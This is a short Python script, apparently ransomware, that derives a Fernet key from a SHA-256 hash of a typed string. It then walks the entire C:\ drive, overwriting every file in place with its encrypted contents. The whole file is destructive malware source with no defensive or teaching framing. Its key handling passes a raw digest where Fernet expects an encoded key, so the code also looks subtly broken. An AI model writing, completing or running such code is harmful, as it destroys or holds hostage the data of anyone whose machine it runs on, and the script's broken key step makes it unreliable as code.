import os
from typing import Text
import hashlib

from cryptography.fernet import Fernet

class ransom_where_key():
    def __init__(self, string: Text):
        self.string_to_key = string

    def sha256_hash_string(self):
        sha256 = hashlib.sha256()
        sha256.update(self.string_to_key.encode('utf-8'))
        return sha256.digest()

    def encrypt_file(self, input_filename):
        cipher_suite = Fernet(self.sha256_hash_string())

        with open(input_filename, "rb") as f:
            plaintext = f.read()

        encrypted_text = cipher_suite.encrypt(plaintext)

        with open(input_filename, "wb") as f:
            f.write(encrypted_text)

    def start(self):
        for root, dirs, files in os.walk("C:\\"):
            print(f"Found {len(files)} files, initiating encryption.")
            for file in files:
                file_path = os.path.join(root, file)
                print(f"Initiating encryption for: {file}")
                self.encrypt_file(file_path)
                print(f"Encryption success!")


if __name__ == "__main__":
    string_to_key = input("Insert key here: ")

    ransomware = ransom_where_key(string_to_key)
    ransomware.start()




